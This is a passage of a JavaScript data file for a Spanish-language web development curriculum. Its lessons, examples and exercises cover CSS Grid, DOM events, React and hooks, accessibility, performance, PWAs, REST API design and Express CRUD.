- **Implicit grid**: tracks creados al volcar más items que líneas definidas.
- **Flow**: algoritmo que decide dónde cae un ítem (\`grid-auto-flow\`).

## 2. Anatomía de la plantilla
\`\`\`css
.container{
  display:grid;
  grid-template-columns:
    [full-start] minmax(2rem,1fr)
    [content-start] repeat(12, minmax(0, 72px))
    [content-end] minmax(2rem,1fr)
    [full-end];
  grid-template-rows: auto 1fr auto;
}
\`\`\`
> ✔️ **Named lines** permiten layouts fluídos + lectura semántica.

## 3. Sub-grid (niveles 2+) — Firefox 71+ / Chrome 117+
Permite heredar la plantilla del contenedor:
\`\`\`css
.card{
  display:grid;
  grid-template-columns: subgrid;
  grid-column: content / span 4;
}
\`\`\`

## 4. Estrategias responsivas
- **Intrínseco**: \`repeat(auto-fit, minmax(14rem,1fr))\` elimina media-queries.
- **Clamp-size**: \`minmax(max-content, 25vw)\`.
- **Holy-Albatross** patrón: anchura fluida ↔ nº de columnas.

## 5. Herramientas pro
- **Firefox Grid Inspector** para depurar líneas explícitas vs implícitas.
- **Chrome DevTools > Layout** muestra tracks + áreas nombradas.  
      `,
      examples: [
        {
          title: "🛰️ Sub-grid Article Cards",
          code: `.cards{
  display:grid;
  gap:1.5rem;
  grid-template-columns: repeat(auto-fill,minmax(280px,1fr));
}
.card{
  display:grid;
  grid-template-rows: subgrid;
  grid-row: span 3;
}
.card img{ grid-row:1 / span 2; }`
        },
        {
          title: "📐 Fluid 12-col Layout sin MQ",
          code: `.wrapper{
  display:grid;
  grid-template-columns:
    minmax(1rem,1fr)
    repeat(auto-fit,minmax(72px,8%))
    minmax(1rem,1fr);
}`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Sistema de Diseño Responsive",
          description: "Crea un grid 12-col con breakpoints fluidos usando repeat(auto-fit/minmax).",
          steps: [
            "1. Identifica puntos de rotura visuales en 320-1920 px.",
            "2. Define named lines [content-start] / [content-end].",
            "3. Inserta sub-grids en componentes 'Card' y 'Header'.",
            "4. Usa grid-column para diseñar secciones hero de ancho completo.",
            "5. Verifica con Firefox Grid Inspector: no tracks implícitos.",
            "6. Mide CLS y layout-shift: debe ser ≤ 0,05."
          ],
          hint: "Utiliza minmax(0, 1fr) para evitar overflow en columnas auto-fit."
        },
        {
          title: "🔬 Ex 2 — Calendar Planner (subgrid)",
          description: "Maqueta un calendario mensual donde cada día herede columnas del contenedor.",
          steps: [
            "1. Contenedor 7 columnas explícitas, 6 filas auto.",
            "2. Cada 'day' usa display:grid; grid-template-columns: subgrid;",
            "3. Añade slot 'events' que haga auto-placement en rows implícitas.",
            "4. Pinta fines de semana con grid-column: span 2/background blend."
          ]
        }
      ],
      resources: [
        { title: "📖 CSS Grid Level 2 (W3C Editor's Draft)", url: "https://drafts.csswg.org/css-grid-2/", description: "Especificación oficial con sub-grid" },
        { title: "🛠️ Grid Generator by Layoutit", url: "https://grid.layoutit.com/", description: "Dibuja gráficamente y exporta código empleado por diseñadores" },
        { title: "📹 Rachel Andrew — Intrinsic Design Talk", url: "https://youtu.be/NTJUF3MJqJk", description: "Profundiza en patrones 'intrinsic vs extrinsic'" }
      ],
      tips: [
        "💡 Evita \`px\` en tracks; usa fr/cm % + minmax para escalabilidad.",
        "💡 Con \`grid-auto-flow: dense\` rellenas huecos sin reordenar DOM.",
        "💡 Prefiere sub-grid a nested grid si necesitas alinear ejes hijo."
      ]
    }
  },
  { id: 'FF4', title: 'DOM y Eventos JS',      category: 'Fundamentos Frontend', activated: false, complexity: 2, prerequisites: ['FF1'],     related: ['FF2'],     summary: 'Manipula el DOM con querySelector y addEventListener. Ej.: btn.addEventListener("click", ()=>{...}). Ejercicio: agrega un modal interactivo.',
    content: {
      theory: `
# DOM API & Event Model avanzado

## 1. Performance mindset
- **Reflow vs Repaint**: limita accesses a layout (offsetTop/Width).
- **DocumentFragment** para inserciones masivas (swap vs innerHTML).

## 2. Passive & capture
\`\`\`js
window.addEventListener('touchstart', onTouch, { passive:true });
\`\`\`
> Pasivo 🔒 → evita \`preventDefault()\` y libera scroll thread.

## 3. Pointer & Keyboard Events
Unifica mouse/touch/pen:
\`\`\`js
btn.addEventListener('pointerdown', handle);
\`\`\`
Accesibilidad AAA:
\`\`\`js
btn.addEventListener('keydown', e=>{
  if(e.key==='Enter' || e.key===' ') handle(e);
});
\`\`\`

## 4. CustomEvent y comunicación interna
\`\`\`js
const savedEvt = new CustomEvent('note:saved', { detail:{ id } });
dispatchEvent(savedEvt);
\`\`\`
      `,
      examples: [
        {
          title: "🛸 Virtual-scroll list (10k rows)",
          code: `const list = document.querySelector('.list');
list.addEventListener('scroll', throttle(render, 16));

function render(){
  const start = Math.floor(list.scrollTop / rowH);
  const visible = Math.ceil(list.clientHeight / rowH);
  /* pinta solo rango start→start+visible */
}`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Editor Markdown en vivo",
          description: "Escucha input event para parsear markdown → preview; usa debounce 150 ms.",
          steps: ["textarea#src → div#preview", "Usa \`innerHTML\` seguro (DOMPurify)."]
        },
        {
          title: "🔬 Ex 2 — Search-as-you-type (passive)",
          description: "Implementa búsqueda instantánea sin bloquear scroll en móvil.",
          steps: [
            "1. Crea input con addEventListener('input', handleSearch, {passive: true})",
            "2. Implementa debounce de 300ms para evitar spam de requests",
            "3. Usa fetch() con AbortController para cancelar requests pendientes",
            "4. Renderiza resultados sin bloquear scroll thread"
          ]
        }
      ],
      resources: [
        { title: "📖 DOM Living Standard (WHATWG)", url: "https://dom.spec.whatwg.org/", description: "Fuente primaria del API" },
        { title: "🔧 Keycode Reference", url: "https://keycode.info/", description: "Tabla completa de códigos para eventos de teclado" }
      ],
      tips: [
        "💡 Usa **event delegation** en listas dinámicas para 10× performance.",
        "💡 detach/attach listeners al usar modales para evitar leaks."
      ]
    }
  },
  { id: 'FF5', title: 'Introducción a React',  category: 'Fundamentos Frontend', activated: false, complexity: 3, prerequisites: ['FF4'],     related: ['FF2'],     summary: 'Crea componentes declarativos. Ej.: function Hello(){return <h1>Hello</h1>}. Ejercicio: convierte tu modal a componente React.',
    content: {
      theory: `
# React Fundamentals 18 — Beyond the Tutorial

## 1. Virtual DOM & Reconciler
- Algoritmo O(n) keyed diffing (heurística "two lists").
- \`key\` estable evita remount y preserva estado.

## 2. Strict Mode (DEV)
Detecta efectos secundarios, doble render en mount.

## 3. Composition over inheritance
<Layout><Sidebar/><Article/></Layout> > herencia clásica.

## 4. Lifting state & Context
Problema "prop-drilling" → Context API o Zustand/Redux.
      `,
      examples: [
        {
          title: "🏗️ Render Props para lista filtrable",
          code: `function Filter({ data, render }){
  const [q,setQ]=useState('');
  const result = data.filter(d=>d.name.includes(q));
  return <>
    <input value={q} onChange={e=>setQ(e.target.value)}/>
    {render(result)}
  </>;
}

// Uso
<Filter data={users} render={list=>
  <ul>{list.map(u=><li key={u.id}>{u.name}</li>)}</ul>} />`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Component Explorer",
          description: "Crea árbol recursivo <TreeNode> con colapso/expand y contador de nodos seleccionados.",
          steps: [
            "1. Crea componente TreeNode que reciba props: node, isExpanded, onToggle",
            "2. Usa useState para manejar collapsed/expanded state",
            "3. Renderiza children recursivamente cuando isExpanded=true",
            "4. Agrega contador global con Context para nodos seleccionados",
            "5. Implementa checkbox para selección múltiple"
          ]
        },
        {
          title: "🔬 Ex 2 — Paginación con Suspense",
          description: "Usa React.lazy y <Suspense fallback> para cargar páginas on-demand.",
          steps: [
            "1. Crea componentes de página con React.lazy(() => import('./Page1'))",
            "2. Envuelve en <Suspense fallback={<Spinner/>}>",
            "3. Implementa navegación con useState para página actual",
            "4. Agrega prefetch al hover sobre botones de paginación"
          ]
        }
      ],
      resources: [
        { title: "📖 React Docs – Thinking in React", url: "https://react.dev/learn/thinking-in-react", description: "Guía oficial para diseño de componentes" },
        { title: "🎥 Dan Abramov – Rethinking React Reactivity", url: "https://youtu.be/lGEMwx6o5Ck", description: "Charla avanzada sobre reconciliación" }
      ],
      tips: [
        "💡 Mantén componentes <200 líneas: separa lógica con custom hooks.",
        "💡 Memoiza callbacks pasados a children intensivos (\`useCallback\`)."
      ]
    }
  },
  { id: 'FF6', title: 'Hooks y Estado',        category: 'Fundamentos Frontend', activated: false, complexity: 3, prerequisites: ['FF5'],     related: [],          summary: 'useState y useEffect para estado y side‑effects. Ej.: const [c,setC]=useState(0). Ejercicio: contador con persistencia localStorage.',
    content: {
      theory: `
# Hooks Profundos – useState, useEffect, useReducer

## 1. Regla de Oro
Llama hooks **solo al nivel superior** y en el **mismo orden**.

## 2. Pitfall: stale closures
\`\`\`js
setInterval(()=>setCount(c=>c+1),1000); // ✅ usa forma funcional
\`\`\`

## 3. useReducer para lógica compleja
\`\`\`js
const [state,dispatch] = useReducer(reducer, {count:0});
function reducer(s,a){
  switch(a.type){
    case'++': return {...s, count:s.count+1};
  }
}
\`\`\`

## 4. Efectos sincrónicos vs asíncronos
- **useLayoutEffect** se ejecuta antes del paint -> bloquea render.
- **useEffect** tras paint -> no bloquea UI.
      `,
      examples: [
        {
          title: "🧠 Custom hook usePrevious",
          code: `function usePrevious(value){
  const ref = useRef();
  useEffect(()=>{ ref.current = value; });
  return ref.current;
}`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Carrusel auto-pausado",
          description: "useEffect con cleanup para detener autoplay al desmontar.",
          steps: [
            "1. Crea componente Carousel con useState para índice actual",
            "2. Usa useEffect para setInterval que avance automáticamente",
            "3. Implementa cleanup con clearInterval en el return",
            "4. Pausa autoplay al hover usando onMouseEnter/Leave",
            "5. Agrega controles manuales prev/next"
          ]
        },
        {
          title: "🔬 Ex 2 — useDebounce hook",
          description: "Devuelve valor solo tras X ms sin cambios; úsalo en buscador.",
          steps: [
            "1. Crea custom hook useDebounce(value, delay)",
            "2. Usa useState para valor debounceDado y useEffect para timer",
            "3. clearTimeout en cada cambio de value",
            "4. Integra en componente SearchInput",
            "5. Verifica que solo haga fetch después del delay"
          ]
        }
      ],
      resources: [
        { title: "🐙 usehooks-ts", url: "https://usehooks-ts.com/", description: "Implementaciones TypeScript listas" }
      ],
      tips: [
        "💡 Evita actualizar estado dentro del mismo efecto que lo lee (bucle).",
        "💡 Prefiere \`useRef\` para valores mutables que no disparan renders."
      ]
    }
  },
  { id: 'FF7', title: 'Accesibilidad Web (A11y)',category: 'Fundamentos Frontend', activated: false, complexity: 3, prerequisites: ['FF1'],   related: [],          summary: 'Roles ARIA, foco visible, contraste. Ej.: <button aria-label="Cerrar">×</button>. Ejercicio: audita con Lighthouse.',
    content: {
      theory: `
# A11y Profesional – WCAG 2.2 y WAI-ARIA

## 1. Landmarks obligatorios
<header>, <nav>, <main>, <footer>, <form>.  
Uso correcto permite navegación con teclas de asistivas (NVDA 'D').

## 2. Árbol de Accesibilidad
- **Nombre accesible** (Accessible Name: algoritmo AOM)
- **Role** nativo o ARIA
- **Estado** (\`aria-expanded\`, \`aria-disabled\`)

## 3. Patrones ARIA Authoring Practices
Ej.: *Disclosure (accordion)*  
\`\`\`html
<button aria-expanded="false" aria-controls="sect1" id="btn1">FAQ</button>
<section id="sect1" hidden>…</section>
\`\`\`

## 4. Focus management
- \`tabindex\` 0 → orde natural, -1 → programmatic focus.
- Evita **focus traps** sin \`Esc\` salida.
      `,
      examples: [
        {
          title: "🔊 Live Regions (alert)",
          code: `<div role="alert" aria-live="assertive">
  Contraseña incorrecta
</div>`
        },
        {
          title: "⌨️ Skip-to-content link",
          code: `<a href="#main" class="skip-link">Saltar al contenido</a>`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Navegación de teclado total",
          description: "Garantiza que TODO tu sitio sea accesible solo con Tab/Shift+Tab y Enter/Espacio.",
          steps: [
            "1. Desconecta mouse y navega solo con teclado",
            "2. Verifica que focus sea visible en todos los elementos",
            "3. Asegúrate que Tab siga orden lógico (top→bottom, left→right)",
            "4. Agrega role='button' y keydown handlers a elementos clickeables",
            "5. Implementa skip-links para navegación rápida",
            "6. Prueba con screen reader (NVDA/VoiceOver)"
          ]
        },
        {
          title: "🔬 Ex 2 — Contraste & Colour Blind test",
          description: "En modo dark/light mantén contraste mínimo 4.5:1; verifica con Chrome DevTools > Lighthouse.",
          steps: [
            "1. Abre Chrome DevTools > Lighthouse > Accessibility",
            "2. Verifica que ratio de contraste sea ≥4.5:1 para texto normal",
            "3. Usa simulador de daltonismo en DevTools > Rendering",
            "4. Ajusta colores problemáticos en CSS",
            "5. Re-ejecuta audit hasta 100% score"
          ]
        }
      ],
      resources: [
        { title: "📖 WAI-ARIA Authoring Practices 1.2", url: "https://www.w3.org/WAI/ARIA/apg/", description: "Patrones oficiales de widgets accesibles" },
        { title: "🔍 axe-core", url: "https://www.deque.com/axe/core-documentation/", description: "Motor de auditoría que usa Google CI" }
      ],
      tips: [
        "💡 Prueba con **NVDA** (Windows) o **VoiceOver** (macOS) regularmente.",
        "💡 No uses \`display:none\` para ocultar modales; emplea \`hidden\` y aria-modal."
      ]
    }
  },
  { id: 'FF8', title: 'Optimización de Rendimiento', category: 'Fundamentos Frontend', activated: false, complexity: 4, prerequisites: ['FF6'], related: [],          summary: 'Lazy loading, code‑splitting. Ej.: const Page=lazy(()=>import("./Page")); Ejercicio: mide Web Vitals en tu app.',
    content: {
      theory: `
# Performance Web – De First Paint a Total Blocking Time

## 1. Web Vitals que importan
| Métrica | Umbral oro | Qué mide |
|---------|------------|----------|
| **LCP** | ≤ 2.5 s    | Render de mayor bloque visible |
| **FID** | ≤ 100 ms   | Latencia primera interacción |
| **CLS** | ≤ 0.1      | Saltos inesperados de layout |
| **TBT** | ≤ 200 ms   | Bloqueo total durante carga |

## 2. Estrategias de optimización
1. **Tree-Shaking & dead-code-elim.** (esbuild/webpack 5).  
2. **Code-Splitting dinámico**: \`import('./Heavy')\` + <Suspense>.  
3. **Preload crítico / Prefetch ocioso**:  
   \`<link rel="preload" as="script" href="main.js">\`
4. **HTTP/2 push y brotli (br)** – comprime ~15 % mejor que gzip.  
5. **Imagenes**: \`<img loading=\"lazy\" decoding=\"async\">\` + AVIF.  
6. **Priority Hints**: \`<link rel=\"stylesheet\" fetchpriority=\"high\">\`.  

## 3. Presupuesto de bundles
\`\`\`bash
# bundle-buddy budgets
{
  "bundles": [{ "id": "main", "budget": 170 * 1024 }]
}
\`\`\`

## 4. Herramientas Pro
- **Lighthouse CI** en PR > falla si LCP empeora 10 %.  
- **Webpack Bundle Analyzer** para ver árboles de dependencias.  
      `,
      examples: [
        {
          title: "⚡ Carga Diferida vía IntersectionObserver",
          code: `const el = document.querySelector('#chart');
const io = new IntersectionObserver(([e])=>{
  if(e.isIntersecting){
    import('./Chart.js').then(mod=>mod.mount(el));
    io.disconnect();
  }
});
io.observe(el);`
        },
        {
          title: "🌐 Critical-CSS Inlining (Next.js)",
          code: `export const reportWebVitals = metric=>{
  if(metric.name==='LCP' && metric.value>2500){
    alert('⚠️ LCP Alto: '+metric.value+'ms');
  }
};`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Presupuesto de 150 kB",
          description: "Configura webpack para romper build si los JS iniciales superan 150 kB brotli.",
          steps: [
            "1. Añade performance.maxAssetSize 153600",
            "2. Activa compression-webpack-plugin con brotli",
            "3. Ejecuta Lighthouse y documenta métricas antes/después"
          ]
        },
        {
          title: "🔬 Ex 2 — Lazy Route React",
          description: "Divide /dashboard en chunk aparte con React.lazy + Suspense, mide TTI."
        }
      ],
      resources: [
        { title: "📖 web.dev/optimize", url: "https://web.dev/optimize/", description: "Guía oficial de optimización Google" },
        { title: "🛠️ Bundle-Sizer", url: "https://bundlephobia.com/", description: "Inspecciona tamaño de dependencias npm" }
      ],
      tips: [
        "💡 Ajusta 'priority' en Next/Image para hero arriba del fold.",
        "💡 Inline only fonts que usas en first view; el resto lazy vía font-display: swap."
      ]
    }
  },
  { id: 'FF9', title: 'PWAs y Service Workers',category: 'Fundamentos Frontend', activated: false, complexity: 4, prerequisites: ['FF6'],     related: [],          summary: 'Offline cache con Workbox. Ej.: navigator.serviceWorker.register("/sw.js"). Ejercicio: convierte tu app en instalable.',
    content: {
      theory: `
# Progressive Web Apps — Más allá del "Add to Home"

## 1. Manifiesto
\`manifest.json\` controla ícono, nombre corto, orientación, y categorías (Play Store).

## 2. Ciclo de vida Service Worker
| Fase | Evento | Clave |
|------|--------|-------|
| instalación | 'install' | precache recursos |
| activación  | 'activate' | limpia caches antiguas |
| fetch       | 'fetch' | estrategia runtime (Network First, Cache First…) |

\`\`\`js
self.addEventListener('install', e=>{
  e.waitUntil(
    caches.open('v3').then(c=>c.addAll(['/','/app.css']))
  );
});
\`\`\`

## 3. Estrategias Workbox v6
- **Stale-While-Revalidate** para fuentes y estilos.  
- **Background Sync**: cola POST offline → reenvía al reconectar.  
- **Periodic Sync** (Chrome) para refresh silencioso.  

## 4. Push & Badging API
Permite notificar, actualizar icono app (Windows, Android).  
      `,
      examples: [
        {
          title: "⚙️ Workbox GenerateSW",
          code: `// workbox.config.js
module.exports = {
  globDirectory: 'dist',
  globPatterns: ['**/*.{js,css,html,png,svg}'],
  runtimeCaching:[{
    urlPattern:/\\/api\\/.*\\/*.json$/,
    handler:'NetworkFirst',
    options:{ cacheName:'api-v1', networkTimeoutSeconds:3 }
  }]
};`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Offline Fallback",
          description: "Implementa página offline.html para fallos de red (NetworkFirst → fallback)."
        },
        {
          title: "🔬 Ex 2 — Sync Lista Tareas",
          description: "Guarda POST /tasks en IndexedDB cuando offline y sincroniza al reconectar con Background Sync."
        }
      ],
      resources: [
        { title: "📖 Workbox Docs", url: "https://developer.chrome.com/docs/workbox/", description: "API y guías oficiales" },
        { title: "🧪 PWA Checklist", url: "https://web.dev/checklist/pwa/", description: "Lista de verificación de Google" }
      ],
      tips: [
        "💡 Cambia el 'scope' en register('/sw.js', { scope:'/' }) para controlar subrutas.",
        "💡 Usa 'imports' en mani-fest para cargar íconos vectoriales y reducir peso."
      ]
    }
  },

  {
    id: 'BA1', 
    title: 'Fundamentos RESTful', 
    category: 'Backend y APIs', 
    activated: true,  
    complexity: 1, 
    prerequisites: [],          
    related: ['BA2'],          
    summary: 'Verbos HTTP, recursos y status codes. Ejercicio: diseña endpoints /users.',
    content: {
      theory: `
# API RESTful - Arquitectura para la Web Moderna

## 🎯 ¿Qué es REST?
REST (Representational State Transfer) es un estilo arquitectónico para diseñar APIs web. Se basa en utilizar HTTP de manera semántica y consistente.

## 🏗️ Principios Fundamentales

### 1. Recursos como Sustantivos
Los endpoints representan **recursos** (sustantivos), no acciones (verbos).

\`\`\`
❌ Mal diseño:
GET /getAllUsers
POST /createUser
POST /deleteUser

✅ Buen diseño:
GET /users          # Obtener todos los usuarios
POST /users         # Crear nuevo usuario
DELETE /users/123   # Eliminar usuario con ID 123
\`\`\`

### 2. Verbos HTTP Semánticos
Cada verbo HTTP tiene un propósito específico:

\`\`\`http
GET    - Leer/Obtener recursos (sin efectos secundarios)
POST   - Crear nuevos recursos
PUT    - Actualizar/Reemplazar recursos completos
PATCH  - Actualizar parcialmente recursos
DELETE - Eliminar recursos
\`\`\`

### 3. Status Codes Apropiados
\`\`\`
2xx - Éxito
  200 OK           - Operación exitosa
  201 Created      - Recurso creado exitosamente
  204 No Content   - Operación exitosa sin contenido

3xx - Redirección
  301 Moved Permanently  - Recurso movido permanentemente
  304 Not Modified       - Recurso no modificado (cache)

4xx - Error del Cliente
  400 Bad Request        - Solicitud malformada
  401 Unauthorized       - Autenticación requerida
  403 Forbidden          - Sin permisos
  404 Not Found          - Recurso no encontrado
  422 Unprocessable Entity - Datos inválidos

5xx - Error del Servidor
  500 Internal Server Error - Error interno
  502 Bad Gateway          - Error de proxy/gateway
  503 Service Unavailable  - Servidor temporalmente no disponible
\`\`\`

## 🌐 Diseño de URLs RESTful

### Estructura Jerárquica
\`\`\`
/users                    # Colección de usuarios
/users/123               # Usuario específico
/users/123/posts         # Posts del usuario 123
/users/123/posts/456     # Post específico del usuario 123
\`\`\`

### Convenciones de Nomenclatura
\`\`\`
✅ Usar sustantivos en plural: /users, /posts, /comments
✅ Usar kebab-case: /user-profiles, /blog-posts
✅ Ser consistente: /users/123/posts (no /user/123/post)
✅ Evitar verbos: /users (no /getUsers)
\`\`\`

## 📋 CRUD Completo

### Operaciones Básicas
\`\`\`http
# Crear usuario
POST /users
Content-Type: application/json

{
  "name": "Ana García",
  "email": "ana@email.com",
  "age": 28
}

# Respuesta: 201 Created
{
  "id": 123,
  "name": "Ana García",
  "email": "ana@email.com",
  "age": 28,
  "createdAt": "2025-07-13T10:30:00Z"
}
\`\`\`

\`\`\`http
# Obtener todos los usuarios
GET /users?page=1&limit=10&sort=name

# Respuesta: 200 OK
{
  "data": [
    {
      "id": 123,
      "name": "Ana García",
      "email": "ana@email.com"
    }
  ],
  "pagination": {
    "page": 1,
    "limit": 10,
    "total": 150,
    "totalPages": 15
  }
}
\`\`\`

\`\`\`http
# Obtener usuario específico
GET /users/123

# Respuesta: 200 OK
{
  "id": 123,
  "name": "Ana García",
  "email": "ana@email.com",
  "age": 28,
  "createdAt": "2025-07-13T10:30:00Z",
  "updatedAt": "2025-07-13T12:15:00Z"
}
\`\`\`

\`\`\`http
# Actualizar usuario completo
PUT /users/123
Content-Type: application/json

{
  "name": "Ana García López",
  "email": "ana.garcia@email.com",
  "age": 29
}

# Respuesta: 200 OK
{
  "id": 123,
  "name": "Ana García López",
  "email": "ana.garcia@email.com",
  "age": 29,
  "updatedAt": "2025-07-13T14:20:00Z"
}
\`\`\`

\`\`\`http
# Actualizar parcialmente
PATCH /users/123
Content-Type: application/json

{
  "age": 30
}

# Respuesta: 200 OK
\`\`\`

\`\`\`http
# Eliminar usuario
DELETE /users/123

# Respuesta: 204 No Content
\`\`\`

## 🔗 Relaciones entre Recursos

### Recursos Anidados
\`\`\`http
# Posts de un usuario específico
GET /users/123/posts

# Comentarios de un post específico
GET /posts/456/comments

# Crear comentario en un post
POST /posts/456/comments
\`\`\`

### Referencias vs Anidamiento
\`\`\`json
{
  "id": 456,
  "title": "Mi Post",
  "authorId": 123,
  "categoryId": 789
}

{
  "id": 456,
  "title": "Mi Post",
  "author": {
    "id": 123,
    "name": "Ana García"
  }
}
\`\`\`

## 🎛️ Parámetros de Query

### Filtrado y Búsqueda
\`\`\`http
GET /users?status=active&role=admin
GET /posts?author=123&category=tech
GET /products?price_min=100&price_max=500
GET /users?search=Ana García
\`\`\`

### Paginación
\`\`\`http
GET /users?page=2&limit=20
GET /users?offset=20&limit=20
\`\`\`

### Ordenamiento
\`\`\`http
GET /users?sort=name
GET /users?sort=-createdAt  # Descendente
GET /users?sort=name,age    # Múltiples campos
\`\`\`

### Campos Específicos
\`\`\`http
GET /users?fields=id,name,email
GET /users/123?include=posts,comments
\`\`\`
      `,
      examples: [
        {
          title: "🚀 API de Blog - Endpoints Principales",
          code: `const express = require('express');
const app = express();
app.use(express.json());

app.get('/users', (req, res) => {
  const { page = 1, limit = 10, search } = req.query;
  
  let users = getAllUsers();
  
  if (search) {
    users = users.filter(user => 
      user.name.toLowerCase().includes(search.toLowerCase())
    );
  }
  
  const startIndex = (page - 1) * limit;
  const paginatedUsers = users.slice(startIndex, startIndex + limit);
  
  res.status(200).json({
    data: paginatedUsers,
    pagination: {
      page: parseInt(page),
      total: users.length,
      totalPages: Math.ceil(users.length / limit)
    }
  });
});

app.post('/users', (req, res) => {
  const { name, email, age } = req.body;
  
  if (!name || !email) {
    return res.status(400).json({
      error: 'Validation failed',
      details: {
        name: !name ? 'Name is required' : null,
        email: !email ? 'Email is required' : null
      }
    });
  }
  
  const newUser = {
    id: generateId(),
    name,
    email,
    age: age || null,
    createdAt: new Date().toISOString()
  };
  
  saveUser(newUser);
  res.status(201).json(newUser);
});

app.put('/users/:id', (req, res) => {
  const { id } = req.params;
  const { name, email, age } = req.body;
  
  const user = findUserById(id);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  const updatedUser = {
    ...user,
    name,
    email,
    age: age || null,
    updatedAt: new Date().toISOString()
  };
  
  updateUser(id, updatedUser);
  res.status(200).json(updatedUser);
});

app.delete('/users/:id', (req, res) => {
  const user = findUserById(req.params.id);
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  deleteUser(req.params.id);
  res.status(204).send();
});

app.listen(3000, () => {
  console.log('🚀 Server running on port 3000');
});`
        },
        {
          title: "📊 Respuestas JSON Estándar",
          code: `// Respuesta exitosa con datos
{
  "data": {
    "id": 123,
    "name": "Ana García",
    "email": "ana@email.com"
  },
  "message": "User retrieved successfully"
}

{
  "data": [
    { "id": 1, "name": "User 1" },
    { "id": 2, "name": "User 2" }
  ],
  "pagination": {
    "page": 1,
    "total": 25,
    "totalPages": 3
  }
}

{
  "error": "Validation failed",
  "message": "The provided data is invalid",
  "details": {
    "email": "Email format is invalid",
    "age": "Age must be a positive number"
  }
}

const successResponse = (res, data, message = 'Success') => {
  return res.status(200).json({
    success: true,
    data,
    message
  });
};

const errorResponse = (res, error, message, statusCode = 500) => {
  return res.status(statusCode).json({
    success: false,
    error,
    message
  });
};`
        }
      ],
      exercises: [
        {
          title: "🎯 Ejercicio 1: API de Biblioteca",
          description: "Diseña y documenta endpoints REST para un sistema de biblioteca (libros, autores, préstamos).",
          steps: [
            "1. Identifica los recursos principales: books, authors, loans",
            "2. Diseña endpoints para CRUD de libros",
            "3. Diseña endpoints para relaciones: /authors/:id/books",
            "4. Agrega endpoints para préstamos: /users/:id/loans",
            "5. Define query parameters para filtrado: ?available=true&genre=fiction",
            "6. Documenta status codes apropiados para cada endpoint",
            "7. Diseña formato de respuesta JSON consistente"
          ],
          hint: "Piensa en la relación entre libros y autores - ¿un libro puede tener múltiples autores?"
        },
        {
          title: "🎯 Ejercicio 2: API de E-commerce",
          description: "Implementa endpoints REST para productos, categorías, carrito y órdenes.",
          steps: [
            "1. CRUD completo para productos (/products)",
            "2. Categorías con productos anidados (/categories/:id/products)",
            "3. Carrito de compras (/users/:id/cart)",
            "4. Órdenes con items (/orders y /orders/:id/items)",
            "5. Búsqueda y filtros avanzados (?price_min=10&brand=nike)",
            "6. Paginación en listados grandes",
            "7. Manejo de inventario (stock disponible)"
          ],
          hint: "El carrito y las órdenes tienen lógicas diferentes - el carrito es temporal, las órdenes son permanentes."
        },
        {
          title: "🎯 Ejercicio 3: Audit y Logging",
          description: "Implementa un sistema de auditoría para tracking de cambios en recursos.",
          steps: [
            "1. Middleware para loggear todas las requests",
            "2. Endpoint /audit para consultar logs",
            "3. Tracking de cambios: qué cambió, quién, cuándo",
            "4. Respuestas con headers de rate limiting",
            "5. Versionado de API (/v1/users vs /v2/users)",
            "6. Health check endpoint (/health)",
            "7. Métricas de uso (/metrics)"
          ],
          hint: "Usa middleware de Express para interceptar requests y responses antes de llegar al handler."
        }
      ],
      resources: [
        {
          title: "📖 REST API Tutorial - MDN",
          url: "https://developer.mozilla.org/en-US/docs/Glossary/REST",
          description: "Conceptos fundamentales de REST según Mozilla"
        },
        {
          title: "🔧 RESTful API Design Best Practices",
          url: "https://restfulapi.net/",
          description: "Guía completa de mejores prácticas para diseño de APIs REST"
        },
        {
          title: "📊 HTTP Status Codes Reference",
          url: "https://httpstatuses.com/",
          description: "Referencia completa de códigos de estado HTTP con ejemplos"
        },
        {
          title: "🧪 Postman - Testing APIs",
          url: "https://www.postman.com/",
          description: "Herramienta para probar y documentar APIs REST"
        }
      ],
      tips: [
        "💡 **Consistencia es clave**: Usa las mismas convenciones en toda tu API",
        "💡 **Status codes semánticos**: 200 para éxito, 201 para creación, 404 para no encontrado",
        "💡 **Versionado**: Incluye versión en URL (/v1/) o headers desde el inicio",
        "💡 **Paginación**: Siempre pagina listas grandes para mejor performance",
        "💡 **Filtrado**: Usa query parameters para filtros (?status=active&sort=name)",
        "💡 **Documentación**: Mantén docs actualizadas - considera OpenAPI/Swagger",
        "💡 **Testing**: Prueba todos los casos edge: recursos inexistentes, datos inválidos, etc."
      ]
    }
  },
  { id: 'BA2', title: 'CRUD con Node & Express',category: 'Backend y APIs',      activated: false, complexity: 2, prerequisites: ['BA1'],      related: [],          summary: 'Endpoints GET/POST/PUT/DELETE. Ej.: app.post("/users",...). Ejercicio: API básica de notas.',
    content: {
      theory: `
# API CRUD Express — Patrón MVC real

## 1. Estructura escalable
\`\`\`
src/
 ├ controllers/
 ├ models/
 ├ routes/
 └ middlewares/
\`\`\`

## 2. Middlewares clave
- **Helmet**: cabeceras seguras
- **Express-Validator**: validación
- **morgan**: logging
- **asyncHandler**: wrapper evita try/catch repetido

## 3. Controladores asincrónicos
\`\`\`js
exports.createUser = asyncHandler(async (req,res)=>{
  const user = await User.create(req.body);
  res.status(201).json(user);
});
\`\`\`

## 4. Pattern Service Layer
Separar lógica negocio de Express → test unitarios puros.
      `,
      examples: [
        {
          title: "🗄️ Router Modular",
          code: `// routes/user.js
const router = require('express').Router();
router.route('/')
  .get(ctrl.getAll)
  .post(validateCreate, ctrl.create);
router.route('/:id')
  .get(ctrl.getById)
  .put(validateUpdate, ctrl.update)
  .delete(ctrl.remove);
module.exports = router;`
        }
      ],
      exercises: [
        {
          title: "🔬 Ex 1 — Notas REST",
          description: "Implementa /notes con título, cuerpo, tags y timestamps; cobertura tests 80 %."
        }
      ],
      resources: [
        { title: "📖 Express Best Practices", url: "https://expressjs.com/en/advanced/best-practice-security.html", description: "Guía oficial seguridad y rendimiento" }
      ],
      tips: [
        "💡 Devuelve siempre objetos, nunca strings sueltos; facilita versionado.",
        "💡 Usa \`dotenv\` para separar credenciales (NODE_ENV, DB_URL…)."
      ]
    }
  },
